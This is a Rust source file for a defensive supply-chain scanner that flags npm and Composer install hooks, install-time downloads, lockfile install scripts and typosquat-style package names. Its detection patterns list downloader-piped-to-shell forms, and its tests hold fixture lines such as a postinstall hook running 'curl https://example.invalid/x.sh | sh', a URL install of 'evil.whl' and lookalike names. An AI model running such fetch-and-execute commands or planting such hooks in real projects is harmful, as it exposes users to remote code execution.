//! Local supply-chain hygiene: install scripts, install-time fetchers, lookalike names.
//! No network. Socket remains an optional extra catalog.
//! Apache-2.0.

use std::fs;
use std::path::Path;
use std::sync::atomic::AtomicBool;

use sha2::{Digest, Sha256};

use crate::engines::walk::WalkedFile;
use crate::types::{NewFinding, Severity};

const MAX_FINDINGS: usize = 80;

const NPM_LIFECYCLE: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "preuninstall",
    "uninstall",
    "postuninstall",
];

const COMPOSER_LIFECYCLE: &[&str] = &[
    "pre-install-cmd",
    "post-install-cmd",
    "pre-update-cmd",
    "post-update-cmd",
];

/// Popular registry names for a distance-1 lookalike check. Not a full catalog.
const POPULAR_NPM: &[&str] = &[
    "react",
    "vue",
    "angular",
    "lodash",
    "underscore",
    "express",
    "axios",
    "webpack",
    "typescript",
    "jquery",
    "bootstrap",
    "redux",
    "moment",
    "rxjs",
    "eslint",
    "prettier",
    "jest",
    "mocha",
    "chalk",
    "debug",
    "commander",
    "glob",
    "minimist",
    "request",
    "dotenv",
    "cors",
    "mongoose",
    "sequelize",
    "jsonwebtoken",
    "bcrypt",
    "nodemon",
    "webpack-cli",
    "node-fetch",
    "cross-env",
    "uuid",
    "ws",
    "redis",
    "graphql",
    "prisma",
    "next",
    "electron",
    "socket.io",
];

const POPULAR_PYPI: &[&str] = &[
    "requests",
    "flask",
    "django",
    "numpy",
    "pandas",
    "pillow",
    "boto3",
    "urllib3",
    "setuptools",
    "pytest",
    "cryptography",
    "pyyaml",
    "click",
    "jinja2",
    "sqlalchemy",
    "fastapi",
    "uvicorn",
    "httpx",
    "aiohttp",
    "pydantic",
    "certifi",
    "scipy",
    "matplotlib",
    "gunicorn",
    "celery",
    "redis",
    "tensorflow",
    "torch",
];

pub fn scan_on(files: &[WalkedFile], cancel: Option<&AtomicBool>) -> Vec<NewFinding> {
    let mut findings = Vec::new();
    for file in files {
        if crate::engines::abort::flagged(cancel) || findings.len() >= MAX_FINDINGS {
            break;
        }
        let path = file.abs.as_path();
        let rel = file.rel.as_str();
        match file.file_name() {
            "package.json" => scan_package_json(path, rel, &mut findings),
            "package-lock.json" => scan_package_lock(path, rel, &mut findings),
            "pnpm-lock.yaml" => scan_pnpm_lock(path, rel, &mut findings),
            "composer.json" => scan_composer_json(path, rel, &mut findings),
            "requirements.txt" => scan_requirements(path, rel, &mut findings),
            _ => {}
        }
    }
    findings
}

fn scan_package_json(path: &Path, rel: &str, out: &mut Vec<NewFinding>) {
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    if let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) {
        for (hook, body) in scripts {
            let Some(body) = body.as_str() else {
                continue;
            };
            let line = line_of(&text, &format!("\"{hook}\""));
            if looks_like_fetch(body) {
                push(
                    out,
                    "install-script-fetch",
                    &format!("Install-time download in npm script `{hook}`"),
                    rel,
                    line,
                    &format!(
                        "Script `{hook}` downloads and runs remote code (`curl`/`wget` piped to a shell, or install-from-URL). Review before `npm install`. File: `{rel}`."
                    ),
                    Severity::High,
                    "CWE-494",
                    "install-script-fetch",
                );
                continue;
            }
            if NPM_LIFECYCLE.iter().any(|h| h.eq_ignore_ascii_case(hook)) {
                push(
                    out,
                    "install-script-npm",
                    &format!("npm lifecycle script `{hook}`"),
                    rel,
                    line,
                    &format!(
                        "`package.json` defines `{hook}`, which npm runs at install/uninstall time. Review the command. This is a local manifest check, not a Socket alert. File: `{rel}`."
                    ),
                    Severity::Medium,
                    "CWE-829",
                    "install-script",
                );
            }
        }
    }
    for key in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
    ] {
        let Some(map) = value.get(key).and_then(|v| v.as_object()) else {
            continue;
        };
        for name in map.keys() {
            if let Some(popular) = lookalike(name, POPULAR_NPM) {
                let line = line_of(&text, &format!("\"{name}\""));
                push_typosquat(out, name, popular, "npm", rel, line);
            }
        }
    }
}

fn scan_package_lock(path: &Path, rel: &str, out: &mut Vec<NewFinding>) {
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let Some(packages) = value.get("packages").and_then(|v| v.as_object()) else {
        return;
    };
    for (key, pkg) in packages {
        if key.is_empty() {
            continue;
        }
        if pkg.get("hasInstallScript").and_then(|v| v.as_bool()) != Some(true) {
            continue;
        }
        let name = pkg
            .get("name")
            .and_then(|v| v.as_str())
            .map(str::to_string)
            .unwrap_or_else(|| lock_package_name(key));
        if name.is_empty() {
            continue;
        }
        push(
            out,
            "install-script-lockfile",
            &format!("Lockfile package `{name}` has an install script"),
            rel,
            None,
            &format!(
                "`{name}` in `{rel}` is marked `hasInstallScript`. npm will run that package's lifecycle scripts on install. Review the dependency. This is a local lockfile check, not a Socket alert."
            ),
            Severity::Medium,
            "CWE-829",
            "lockfile-install-script",
        );
    }
}

fn scan_pnpm_lock(path: &Path, rel: &str, out: &mut Vec<NewFinding>) {
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    let mut last_name: Option<String> = None;
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.ends_with(':')
            && !trimmed.starts_with("resolution")
            && !trimmed.starts_with("engines")
            && !trimmed.starts_with("peer")
        {
            if let Some(name) = pnpm_key_name(trimmed.trim_end_matches(':')) {
                last_name = Some(name);
            }
        }
        if trimmed == "hasInstallScript: true" {
            if let Some(name) = last_name.as_deref() {
                push(
                    out,
                    "install-script-lockfile",
                    &format!("Lockfile package `{name}` has an install script"),
                    rel,
                    None,
                    &format!(
                        "`{name}` in `{rel}` is marked `hasInstallScript`. pnpm will run that package's lifecycle scripts on install. Review the dependency. This is a local lockfile check, not a Socket alert."
                    ),
                    Severity::Medium,
                    "CWE-829",
                    "lockfile-install-script",
                );
            }
        }
    }
}

fn scan_composer_json(path: &Path, rel: &str, out: &mut Vec<NewFinding>) {
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) else {
        return;
    };
    for (hook, body) in scripts {
        if !COMPOSER_LIFECYCLE
            .iter()
            .any(|h| h.eq_ignore_ascii_case(hook))
        {
            continue;
        }
        let rendered = match body {
            serde_json::Value::String(s) => s.clone(),
            serde_json::Value::Array(items) => items
                .iter()
                .filter_map(|v| v.as_str())
                .collect::<Vec<_>>()
                .join("; "),
            _ => String::new(),
        };
        let line = line_of(&text, &format!("\"{hook}\""));
        if looks_like_fetch(&rendered) {
            push(
                out,
                "install-script-fetch",
                &format!("Install-time download in Composer script `{hook}`"),
                rel,
                line,
                &format!(
                    "Composer `{hook}` downloads and runs remote code. Review before `composer install`. File: `{rel}`."
                ),
                Severity::High,
                "CWE-494",
                "install-script-fetch",
            );
            continue;
        }
        push(
            out,
            "install-script-composer",
            &format!("Composer lifecycle script `{hook}`"),
            rel,
            line,
            &format!(
                "`composer.json` defines `{hook}`, which Composer runs on install/update. Review the command. File: `{rel}`."
            ),
            Severity::Medium,
            "CWE-829",
            "install-script",
        );
    }
}

fn scan_requirements(path: &Path, rel: &str, out: &mut Vec<NewFinding>) {
    let Ok(text) = fs::read_to_string(path) else {
        return;
    };
    for (idx, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with('-') {
            continue;
        }
        let lineno = Some((idx + 1) as i64);
        let lower = line.to_ascii_lowercase();
        if lower.starts_with("http://")
            || lower.starts_with("https://")
            || lower.contains(" @ http://")
            || lower.contains(" @ https://")
        {
            push(
                out,
                "install-script-fetch",
                "requirements.txt installs from a URL",
                rel,
                lineno,
                &format!(
                    "This line installs a package from HTTP(S) instead of a pinned PyPI name. Review the source. `{rel}:{}`.",
                    idx + 1
                ),
                Severity::High,
                "CWE-494",
                "install-script-fetch",
            );
            continue;
        }
        let name = line
            .split(['>', '<', '=', '!', '~', ' ', '['])
            .next()
            .unwrap_or(line)
            .trim();
        if let Some(popular) = lookalike(name, POPULAR_PYPI) {
            push_typosquat(out, name, popular, "PyPI", rel, lineno);
        }
    }
}

fn looks_like_fetch(script: &str) -> bool {
    let s = script.to_ascii_lowercase().replace(['\n', '\r', '\t'], " ");
    let downloader = s.contains("curl ")
        || s.contains("wget ")
        || s.contains("iwr ")
        || s.contains("invoke-webrequest")
        || s.contains("invoke-restmethod");
    let piped_shell = [
        "| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "| dash", "| iex", "|iex",
    ]
    .iter()
    .any(|p| s.contains(p));
    if downloader && piped_shell {
        return true;
    }
    s.contains("pip install http://")
        || s.contains("pip install https://")
        || s.contains("pip3 install http://")
        || s.contains("pip3 install https://")
        || s.contains("npm install http://")
        || s.contains("npm install https://")
}

fn lookalike<'a>(name: &str, popular: &[&'a str]) -> Option<&'a str> {
    let candidate = unscoped(name).to_ascii_lowercase();
    if candidate.len() < 3 {
        return None;
    }
    if popular.iter().any(|p| *p == candidate) {
        return None;
    }
    popular
        .iter()
        .copied()
        .find(|p| is_lookalike(&candidate, p))
}

fn unscoped(name: &str) -> &str {
    if let Some(rest) = name.strip_prefix('@') {
        rest.split_once('/').map(|(_, n)| n).unwrap_or(name)
    } else {
        name
    }
}

fn is_lookalike(a: &str, popular: &str) -> bool {
    if a == popular {
        return false;
    }
    let gap = a.len().abs_diff(popular.len());
    if gap > 1 {
        return false;
    }
    let dist = edit_distance(a, popular);
    if popular.len() <= 3 {
        dist == 1 && gap == 0
    } else {
        dist == 1
    }
}

fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (n, m) = (a.len(), b.len());
    let mut d = vec![vec![0usize; m + 1]; n + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=n {
        for j in 1..=m {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            d[i][j] = (d[i - 1][j] + 1)
                .min(d[i][j - 1] + 1)
                .min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                d[i][j] = d[i][j].min(d[i - 2][j - 2] + 1);
            }
        }
    }
    d[n][m]
}

fn lock_package_name(key: &str) -> String {
    key.rsplit("/node_modules/")
        .next()
        .unwrap_or(key)
        .trim_start_matches("node_modules/")
        .to_string()
}

fn pnpm_key_name(key: &str) -> Option<String> {
    let key = key.trim().trim_matches('\'').trim_matches('"');
    if key.is_empty() || key.contains(' ') {
        return None;
    }
    let key = key.trim_start_matches('/');
    if !key.contains('@')
        && !key.contains('.')
        && key
            .chars()
            .all(|c| c.is_ascii_lowercase() || c == '-' || c == '_')
    {
        return None;
    }
    let name = if key.starts_with('@') {
        let rest = key.trim_start_matches('@');
        let (scope, after) = rest.split_once('/')?;
        let pkg = after.split('@').next().unwrap_or(after);
        format!("@{scope}/{pkg}")
    } else {
        key.split('@').next().unwrap_or(key).to_string()
    };
    if name.is_empty() || name == "packages" {
        return None;
    }
    Some(name)
}

fn line_of(text: &str, needle: &str) -> Option<i64> {
    text.lines()
        .position(|line| line.contains(needle))
        .map(|i| (i + 1) as i64)
}

fn push_typosquat(
    out: &mut Vec<NewFinding>,
    name: &str,
    popular: &str,
    ecosystem: &str,
    rel: &str,
    line: Option<i64>,
) {
    push(
        out,
        "possible-typosquat",
        &format!("`{name}` looks like popular {ecosystem} package `{popular}`"),
        rel,
        line,
        &format!(
            "Declared `{name}` is one edit away from `{popular}`. Confirm this is the intended package. Local name check only — not a Socket catalog hit. File: `{rel}`."
        ),
        Severity::Medium,
        "CWE-1104",
        "typosquat",
    );
}

#[allow(clippy::too_many_arguments)]
fn push(
    out: &mut Vec<NewFinding>,
    rule_id: &str,
    title: &str,
    rel: &str,
    line: Option<i64>,
    why: &str,
    severity: Severity,
    cwe: &str,
    kind: &str,
) {
    if out.len() >= MAX_FINDINGS {
        return;
    }
    if out
        .iter()
        .any(|f| f.rule_id == rule_id && f.title == title && f.path.as_deref() == Some(rel))
    {
        return;
    }
    let mut hasher = Sha256::new();
    hasher.update(rule_id.as_bytes());
    hasher.update(title.as_bytes());
    hasher.update(rel.as_bytes());
    if let Some(n) = line {
        hasher.update(n.to_le_bytes());
    }
    let digest = hasher.finalize();
    out.push(NewFinding {
        fingerprint: format!(
            "hyg:{}",
            digest
                .iter()
                .take(12)
                .map(|b| format!("{b:02x}"))
                .collect::<String>()
        ),
        severity,
        confidence: if kind == "typosquat" {
            "medium".into()
        } else {
            "high".into()
        },
        category: "sca".into(),
        rule_id: rule_id.into(),
        title: title.into(),
        description: why.into(),
        path: Some(rel.to_string()),
        line_start: line,
        line_end: line,
        cwe: vec![cwe.into()],
        cve: vec![],
        evidence: serde_json::json!({
            "engine": "achilles-hygiene-v0",
            "kind": kind
        }),
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engines::walk::{self, WalkOpts};
    use std::fs;
    use tempfile::tempdir;

    fn scan_dir(root: &Path) -> Vec<NewFinding> {
        let files = walk::walk_files(root, WalkOpts::default(), |_, _| true);
        scan_on(&files, None)
    }

    #[test]
    fn flags_postinstall_and_fetch_and_lookalike() {
        let tmp = tempdir().unwrap();
        fs::write(
            tmp.path().join("package.json"),
            r#"{
  "dependencies": { "lodahs": "1.0.0", "lodash": "4.17.21" },
  "scripts": {
    "postinstall": "curl https://example.invalid/x.sh | sh",
    "preinstall": "node ./hooks.js"
  }
}"#,
        )
        .unwrap();
        let hits = scan_dir(tmp.path());
        assert!(
            hits.iter().any(|f| f.rule_id == "install-script-fetch"),
            "{:?}",
            hits.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
        assert!(hits.iter().any(|f| f.rule_id == "install-script-npm"));
        assert!(hits
            .iter()
            .any(|f| f.rule_id == "possible-typosquat" && f.title.contains("lodahs")));
        assert!(!hits.iter().any(|f| f.title.contains("`lodash` looks like")));
    }

    #[test]
    fn flags_lockfile_has_install_script() {
        let tmp = tempdir().unwrap();
        fs::write(
            tmp.path().join("package-lock.json"),
            r#"{
  "packages": {
    "": { "name": "app" },
    "node_modules/evil-hooks": { "version": "1.0.0", "hasInstallScript": true }
  }
}"#,
        )
        .unwrap();
        let hits = scan_dir(tmp.path());
        assert!(hits
            .iter()
            .any(|f| f.rule_id == "install-script-lockfile" && f.title.contains("evil-hooks")));
    }

    #[test]
    fn flags_pypi_lookalike_and_url_install() {
        let tmp = tempdir().unwrap();
        fs::write(
            tmp.path().join("requirements.txt"),
            "requets\nhttps://example.invalid/evil.whl\nrequests==2.28.0\n",
        )
        .unwrap();
        let hits = scan_dir(tmp.path());
        assert!(hits
            .iter()
            .any(|f| f.rule_id == "possible-typosquat" && f.title.contains("requets")));
        assert!(hits.iter().any(|f| f.rule_id == "install-script-fetch"));
        assert!(!hits
            .iter()
            .any(|f| f.title.contains("`requests` looks like")));
    }

    #[test]
    fn deps_hygiene_fixture() {
        let root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../examples/achilles-fixtures/deps-hygiene");
        let hits = scan_dir(&root);
        let ids: Vec<_> = hits.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"install-script-fetch"), "{ids:?}");
        assert!(ids.contains(&"install-script-npm"), "{ids:?}");
        assert!(ids.contains(&"install-script-lockfile"), "{ids:?}");
        assert!(ids.contains(&"possible-typosquat"), "{ids:?}");
    }

    #[test]
    fn lookalike_one_edit() {
        assert_eq!(edit_distance("lodahs", "lodash"), 1);
        assert_eq!(edit_distance("lodash", "lodash"), 0);
        assert_eq!(edit_distance("requets", "requests"), 1);
        assert!(is_lookalike("lodahs", "lodash"));
        assert!(!is_lookalike("lodash", "lodash"));
        assert!(!is_lookalike("react-dom", "react"));
    }
}
